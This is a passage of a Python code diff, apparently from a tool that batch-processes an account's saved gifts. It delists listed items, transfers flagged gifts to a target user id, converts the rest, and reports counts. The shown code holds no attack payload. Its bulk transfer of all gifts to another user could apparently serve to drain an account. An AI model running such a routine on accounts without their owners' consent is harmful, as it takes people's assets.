+            rec = {"gift_id": g["gift_id"], "title": g["title"]}
+            try:
+                if g.get("bc"):
+                    return ("skip_bc", rec)
+                if g.get("listed"):
+                    dr = self._delist_saved_gift(g)
+                    if dr.get("ok"):
+                        rec["delist"] = True
+                if g.get("u"):
+                    r = self._transfer_saved_gift(g, uid, ah)
+                    if r.get("ok"):
+                        return ("ok", rec)
+                    return ("fail", rec)
+                else:
+                    r = self._convert_saved_gift(g)
+                    if r.get("ok"):
+                        return ("convert", rec)
+                    return ("fail", rec)
+            except Exception:
+                return ("fail", rec)
+        results = self._parallel([(_one, g) for g in gifts], workers=workers, timeout=180)
+        report = {"total": len(gifts), "ok": 0, "fail": 0, "convert": 0,
+                  "skip_bc": 0, "delist": 0}
+        for r in results:
+            try:
+                kind, rec = r
